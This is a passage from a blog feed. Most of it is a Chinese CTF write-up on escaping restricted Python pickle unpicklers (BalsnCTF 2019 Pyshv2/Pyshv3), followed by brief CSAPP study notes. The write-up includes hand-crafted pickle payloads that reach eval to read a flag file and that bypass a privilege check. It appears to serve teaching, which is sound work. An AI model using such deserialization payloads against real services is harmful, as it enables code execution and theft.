rel="noopener">https://pyzh.readthedocs.io/en/latest/python-magic-methods-guide.html</a></p><p><img src="http://ww1.sinaimg.cn/large/de75fd55ly1g802k3rxitj20gz0p0q4f.jpg" alt="image.png"></p><p>这个 <code>__getattribute__</code> 恰好能符合我们的要求，真棒。</p><figure class="highlight"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>getattr(structs, <span class="string">'__getattribute__'</span>)(<span class="string">'__builtins__'</span>)</span><br><span class="line">&#123;'__name__': 'builtins', '__doc__': "Built-in functions, exceptions, and other objects.\n\nNoteworthy: None is the `nil' object; Ellipsis represents `...' in slices.", '__package__': '', '__loader__': &lt;class '_frozen_importlib.BuiltinImporter'&gt;, '__spec__': ModuleSpec(name='builtins', loader=&lt;class '_frozen_importlib.BuiltinImporter'&gt;),...</span><br></pre></td></tr></table></figure><p>再理下思路：（伪代码）</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = getattr(structs, <span class="string">'__builtins__'</span>)   <span class="comment"># 获取到字典，先存起来</span></span><br><span class="line">getattr(structs, <span class="string">'__import__'</span>) = getattr(structs, <span class="string">'__getattribute__'</span>)  <span class="comment"># 覆盖 __import__</span></span><br><span class="line">setattr(structs, <span class="string">'structs'</span>, d)   <span class="comment"># 创建个 structs 的属性，字典写入该属性</span></span><br><span class="line">mo = __import__(structs) <span class="comment"># 此时的 mo 就是我们之前的 __builtins__</span></span><br><span class="line">getattr(mo, <span class="string">'get'</span>)     <span class="comment"># 获取到 get 方法，然后就可以按照 pyshv1 的思路来了</span></span><br></pre></td></tr></table></figure><p>转换为 pickle：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cstructs</span><br><span class="line">__getattribute__</span><br><span class="line">p100</span><br><span class="line">0cstructs</span><br><span class="line">__dict__</span><br><span class="line">S&apos;structs&apos;</span><br><span class="line">cstructs</span><br><span class="line">__builtins__# 先添加 structs 属性</span><br><span class="line">p101</span><br><span class="line">sg101</span><br><span class="line">S&apos;__import__&apos;</span><br><span class="line">g100</span><br><span class="line">scstructs</span><br><span class="line">get</span><br><span class="line">(S&apos;eval&apos;</span><br><span class="line">tR(S&apos;print(open(&quot;../flag&quot;).read())&apos;   # 这里已经不能 __import__(&apos;os&apos;) 了，能继续执行命令吗：）</span><br><span class="line">tR.</span><br></pre></td></tr></table></figure><h3 id="BalsnCTF-2019-Pyshv3"><a href="#BalsnCTF-2019-Pyshv3" class="headerlink" title="BalsnCTF 2019 Pyshv3"></a>BalsnCTF 2019 Pyshv3</h3><blockquote><p>环境： <a href="https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3" target="_blank" rel="noopener">https://github.com/sasdf/ctf/tree/master/tasks/2019/BalsnCTF/misc/pyshv3</a></p></blockquote><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># File: securePickle.py</span></span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">import</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">whitelist = []</span><br><span class="line"></span><br><span class="line"><span class="comment"># See https://docs.python.org/3.7/library/pickle.html#restricting-globals</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RestrictedUnpickler</span><span class="params">(pickle.Unpickler)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">find_class</span><span class="params">(self, module, name)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> module <span class="keyword">not</span> <span class="keyword">in</span> whitelist <span class="keyword">or</span> <span class="string">'.'</span> <span class="keyword">in</span> name:</span><br><span class="line">            <span class="keyword">raise</span> KeyError(<span class="string">'The pickle is spoilt :('</span>)</span><br><span class="line">        <span class="keyword">return</span> pickle.Unpickler.find_class(self, module, name)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">loads</span><span class="params">(s)</span>:</span></span><br><span class="line">    <span class="string">"""Helper function analogous to pickle.loads()."""</span></span><br><span class="line">    <span class="keyword">return</span> RestrictedUnpickler(io.BytesIO(s)).load()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">dumps = pickle.dumps</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># File: server.py</span></span><br><span class="line"><span class="keyword">import</span> securePickle <span class="keyword">as</span> pickle</span><br><span class="line"><span class="keyword">import</span> codecs</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pickle.whitelist.append(<span class="string">'structs'</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Pysh</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.key = os.urandom(<span class="number">100</span>)</span><br><span class="line">        self.login()</span><br><span class="line">        self.cmds = &#123;</span><br><span class="line">            <span class="string">'help'</span>: self.cmd_help,</span><br><span class="line">            <span class="string">'whoami'</span>: self.cmd_whoami,</span><br><span class="line">            <span class="string">'su'</span>: self.cmd_su,</span><br><span class="line">            <span class="string">'flag'</span>: self.cmd_flag,</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">login</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">with</span> open(<span class="string">'../flag.txt'</span>, <span class="string">'rb'</span>) <span class="keyword">as</span> f:</span><br><span class="line">            flag = f.read()</span><br><span class="line">        flag = bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.key, flag))</span><br><span class="line">        user = input().encode(<span class="string">'ascii'</span>)</span><br><span class="line">        user = codecs.decode(user, <span class="string">'base64'</span>)</span><br><span class="line">        user = pickle.loads(user)</span><br><span class="line">        print(<span class="string">'Login as '</span> + user.name + <span class="string">' - '</span> + user.group)</span><br><span class="line">        user.privileged = <span class="literal">False</span></span><br><span class="line">        user.flag = flag</span><br><span class="line">        self.user = user</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            req = input(<span class="string">'$ '</span>)</span><br><span class="line">            func = self.cmds.get(req, <span class="literal">None</span>)</span><br><span class="line">            <span class="keyword">if</span> func <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">                print(<span class="string">'pysh: '</span> + req + <span class="string">': command not found'</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                func()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_help</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">'Available commands: '</span> + <span class="string">' '</span>.join(self.cmds.keys()))</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_whoami</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(self.user.name, self.user.group)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_su</span><span class="params">(self)</span>:</span></span><br><span class="line">        print(<span class="string">"Not Implemented QAQ"</span>)</span><br><span class="line">        <span class="comment"># self.user.privileged = 1</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">cmd_flag</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.user.privileged:</span><br><span class="line">            print(<span class="string">'flag: Permission denied'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(bytes(a ^ b <span class="keyword">for</span> a, b <span class="keyword">in</span> zip(self.user.flag, self.key)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    pysh = Pysh()</span><br><span class="line">    pysh.run()</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line"><span class="comment"># File: structs.py</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, name, group)</span>:</span></span><br><span class="line">        self.name = name</span><br><span class="line">        self.group = group</span><br><span class="line">        self.isadmin = <span class="number">0</span></span><br><span class="line">        self.prompt = <span class="string">''</span></span><br></pre></td></tr></table></figure><p><code>RestrictedUnpickler</code> 模块和 Pyshv1 是一样的，之前只有名字的函数在这里基本都实现了。</p><p>注意到，在 <code>cmd_flag()</code> 中，<code>self.user.privileged</code> 只要就符合条件将输出 flag。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">user = pickle.loads(user)</span><br><span class="line">user.privileged = <span class="literal">False</span>  <span class="comment"># 这个有点猛，后面还有赋值，没法直接覆盖了</span></span><br></pre></td></tr></table></figure><p>魔术方法列表中可以看到，给属性赋值时，用的是 <code>__setattr__(self, name)</code>，能不能把这个干掉？</p><p>看来不太行，把这个干了，flag 自然也赋值不上了。能不能保留 <code>privileged</code> ，同时又不干扰 <code>flag</code>？</p><p>继续在魔术方法里寻找，突然看到了一个<code>创建描述符对象</code>里有 <code>__set__</code> 方法，会不会有点关系呢。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g80iq605w2j20hd0gcdgu.jpg" alt="image.png"></p><blockquote><p>属性访问的默认行为是从一个对象的字典中获取、设置或删除属性。例如，<code>a.x</code> 的查找顺序会从 <code>a.__dict__[&#39;x&#39;]</code> 开始，然后是 <code>type(a).__dict__[&#39;x&#39;]</code>，接下来依次查找 <code>type(a)</code> 的基类，不包括元类 如果找到的值是定义了某个描述器方法的对象，则 Python 可能会重载默认行为并转而发起调用描述器方法。这具体发生在优先级链的哪个环节则要根据所定义的描述器方法及其被调用的方式来决定。 </p></blockquote><p>关于描述符的讲解还可以看下这文章：<a href="https://foofish.net/what-is-descriptor-in-python.html" target="_blank" rel="noopener">https://foofish.net/what-is-descriptor-in-python.html</a></p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">RevealAccess</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="string">"""A data descriptor that sets and returns values</span></span><br><span class="line"><span class="string">       normally and prints a message logging their access.</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, initval=None, name=<span class="string">'var'</span>)</span>:</span></span><br><span class="line">        self.val = initval</span><br><span class="line">        self.name = name</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__get__</span><span class="params">(self, obj, objtype)</span>:</span></span><br><span class="line">        print(<span class="string">'Retrieving'</span>, self.name)</span><br><span class="line">        <span class="keyword">return</span> self.val</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        print(<span class="string">'Updating'</span>, self.name)</span><br><span class="line">        self.val = val</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line"><span class="meta">... </span>    x = RevealAccess(<span class="number">10</span>, <span class="string">'var "x"'</span>)</span><br><span class="line"><span class="meta">... </span>    y = <span class="number">5</span></span><br><span class="line">...</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m = MyClass()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">10</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x = <span class="number">20</span></span><br><span class="line">Updating var <span class="string">"x"</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.x</span><br><span class="line">Retrieving var <span class="string">"x"</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>m.y</span><br><span class="line"><span class="number">5</span></span><br></pre></td></tr></table></figure><p>可清楚的看到，对属性 <code>x</code> 的操作都被 “hook” 住了，而 <code>y</code> 没有受影响。这就有个小问题，反序列化时没有额外的自定义类引入了，比如这里的 <code>RevealAccess</code>，怎么给指定属性进行代理呢？那就把自己作为一个描述符：）。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyClass</span><span class="params">(object)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__set__</span><span class="params">(self, obj, val)</span>:</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    </span><br><span class="line">    y = <span class="number">5</span></span><br><span class="line">    </span><br><span class="line">m = MyClass()</span><br><span class="line">MyClass.x = m</span><br><span class="line">print(m.x)</span><br><span class="line">m.y = <span class="number">6</span></span><br><span class="line">print(m.y)</span><br><span class="line">m.x = <span class="number">3</span></span><br><span class="line">print(m.x)</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">6</span></span><br><span class="line"><span class="string">&lt;__main__.MyClass object at 0x000001CBA8A93C48&gt;</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><p>把这个过程转为 pickle：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cstructs</span><br><span class="line">User</span><br><span class="line">p100</span><br><span class="line">(I111</span><br><span class="line">I222</span><br><span class="line">tRp101</span><br><span class="line">g100</span><br><span class="line">(N&#125;S&apos;__set__&apos;</span><br><span class="line">g100</span><br><span class="line">sS&apos;privileged&apos;</span><br><span class="line">g101</span><br><span class="line">stbg101</span><br><span class="line">.</span><br></pre></td></tr></table></figure><p>看一下结果：</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g81bht0kk3j20sr0ifwfr.jpg" alt="image.png"></p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf" target="_blank" rel="noopener">https://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_Slides.pdf</a></p><p><a href="http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf" target="_blank" rel="noopener">http://media.blackhat.com/bh-us-11/Slaviero/BH_US_11_Slaviero_Sour_Pickles_WP.pdf</a></p><p><a href="https://www.k0rz3n.com/2018/11/12/%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E5%B8%A6%E4%BD%A0%E7%90%86%E8%A7%A3%E6%BC%8F%E6%B4%9E%E4%B9%8BPython%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E/" target="_blank" rel="noopener">https://www.k0rz3n.com/2018/11/12/一篇文章带你理解漏洞之Python 反序列化漏洞/</a></p><p><a href="https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html" target="_blank" rel="noopener">https://www.leavesongs.com/PENETRATION/code-breaking-2018-python-sandbox.html</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;本文首发于安全客：&lt;a href=&quot;https://www.anquanke.com/post/id/188981&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.anquanke.com/post/id/1
      
    
    </summary>
    
    
      <category term="Writeup" scheme="https://wywwzjj.top/tags/Writeup/"/>
    
      <category term="反序列化" scheme="https://wywwzjj.top/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 存储器层次结构 笔记</title>
    <link href="https://wywwzjj.top/2019/10/21/CSAPP-Chapter-6-Notes/"/>
    <id>https://wywwzjj.top/2019/10/21/CSAPP-Chapter-6-Notes/</id>
    <published>2019-10-21T12:30:19.000Z</published>
    <updated>2020-03-22T10:11:48.054Z</updated>
    
    <content type="html"><![CDATA[<p>在简单的模型中，存储器系统是一个线性的字节数组，CPU 能够在一个常数时间内访问每个存储器位置。</p><p>但这并没有反映现代系统实际工作的方式，实际的存储系统是一个具有不同容量、成本和访问时间的存储设备层次结构。</p><h2 id="存储技术"><a href="#存储技术" class="headerlink" title="存储技术"></a>存储技术</h2><h3 id="随机访问存储器-RAM"><a href="#随机访问存储器-RAM" class="headerlink" title="随机访问存储器 RAM"></a>随机访问存储器 RAM</h3><ul><li>静态 SRAM：容量小，存取速度快，以触发器（双稳态）做为存储元，通常做 cache。</li><li>动态 DRAM：容量大，速度较慢，以 MOS 晶体管和电容器组成的电路做存储元，通常做主存储器。</li></ul><h3 id="磁盘存储"><a href="#磁盘存储" class="headerlink" title="磁盘存储"></a>磁盘存储</h3><p>磁盘属于外部 I/O 设备，其特点是存储容量大，速度慢，价格便宜。其利用磁性材料被磁化后，会形成两个稳定的剩磁状态的性质，就像触发器的双稳态一样。</p><h2 id="局部性原理"><a href="#局部性原理" class="headerlink" title="局部性原理"></a>局部性原理</h2><p>在程序中，程序倾向于引用邻近与其他最近引用过的数据项的数据项，或者最近引用过的数据项本身。这种倾向性，被称为局部性原理。</p><p>这是一个持久的概念，对硬件和软件系统的设计和性能都有着极大的影响。</p><p>局部性通常有两种不同的形式，时间上，空间上。</p><p>在一个具有良好时间局部性的程序中，如果一个内存位置被引用了一次，那么程序很可能在不远的将来引用附近的一个内存位置。</p><h2 id="存储器层次结构"><a href="#存储器层次结构" class="headerlink" title="存储器层次结构"></a>存储器层次结构</h2><p>不同存储技术的访问时间差异很大。速度较快的技术每字节的成本要比速度较慢的技术高，而且容量较小。CPU 和主存之间的速度差距在增大。</p><p>一个编写良好的程序倾向于展示出良好的局部性。</p><h2 id="高速缓存存储器"><a href="#高速缓存存储器" class="headerlink" title="高速缓存存储器"></a>高速缓存存储器</h2><p>缓存的理念，简单来说就是，最常用的数据就那么点，将其放到读取速度最快的存储区域，将大大提高运行效率。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在简单的模型中，存储器系统是一个线性的字节数组，CPU 能够在一个常数时间内访问每个存储器位置。&lt;/p&gt;
&lt;p&gt;但这并没有反映现代系统实际工作的方式，实际的存储系统是一个具有不同容量、成本和访问时间的存储设备层次结构。&lt;/p&gt;
&lt;h2 id=&quot;存储技术&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
  <entry>
    <title>CSAPP 程序的机器级表示 笔记</title>
    <link href="https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/"/>
    <id>https://wywwzjj.top/2019/10/10/CSAPP-Chapter-3-Notes/</id>
    <published>2019-10-10T15:33:45.000Z</published>
    <updated>2020-03-22T10:11:48.054Z</updated>
    
    <content type="html"><![CDATA[<p>在计算机组成原理中学到过，每个机器码对应着一组控制信号，汇编代码则是机器代码的文本表示。</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gcc -Og -c hello.c  # 表示优化等级为最低，贴近原始汇编</span><br><span class="line"></span><br><span class="line">-O （同-O1）</span><br><span class="line">-O0 （不进行优化，如果未指定优化级别，则为默认值）</span><br><span class="line">-O1 （最小化优化）</span><br><span class="line">-O2 （优化更多）</span><br><span class="line">-O3 （优化更多）</span><br><span class="line">-Ofast （非常积极地进行优化以达到标准的要求）</span><br><span class="line">-Og （优化调试体验-Og支持不影响调试的优化 ）</span><br><span class="line">-Os（优化大小。-Os使所有-O2的优化，通常不会增加代码的大小也进行设计，以减少代码量进一步优化。 -Os禁用以下优化标志：-falign-functions -falign-jumps -falign-loops -falign-labels -freorder-blocks -freorder-blocks-and-partition -fprefetch-loop-arrays -ftree-vect-loop-version）</span><br></pre></td></tr></table></figure><p>对于机器级编程来说，其中两种抽象尤为重要。</p><p>一个是机器级程序的格式和行为，定义为<strong>指令体系结构</strong>（Instruction Set Architecture，ISA ），它定义了处理器状态，指令的格式以及每条指令对状态的影响。大多数ISA,包括IA32和x86-64，将程序的行为描述成<strong>好像</strong>每条指令时顺序执行的。一条指令执行结束后，下一条指令开始执行。处理器的硬件远远比描述的精细复杂，它们能够并发的地执行许多指令，但是可以采取措施保证整体行为与ISA指定的顺序执行行为一致。</p><p>第二种抽象是，机器级程序使用的存储器地址是<strong>虚拟地址</strong>，提供的存储器模型看上去是一个非常大的字节数组。</p><p>在整个编译过程中，编译器会主要将C语言提供的相对抽象的执行模型表示的程序转化为处理器执行的非常基本的命令。汇编代码非常接近于机器代码。与机器码的二进制格式相比，汇编代码的一个主要特点是，<strong>它用可读性更好的文本格式来表示。</strong></p><p><strong>能够理解汇编代码以及它与原始C代码的联系，是理解计算机系统如何执行程序关键的一步。</strong></p><p>二三章还是没啥意思，以前都学过了，最近在看<em>程序员的自我修养</em>，真是一本好书，解决了很多我对底层的疑问，一定要多读几遍。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;在计算机组成原理中学到过，每个机器码对应着一组控制信号，汇编代码则是机器代码的文本表示。&lt;/p&gt;
&lt;figure class=&quot;highlight shell&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;gcc 
      
    
    </summary>
    
    
      <category term="读书笔记" scheme="https://wywwzjj.top/tags/%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/"/>
    
  </entry>
  
</feed>
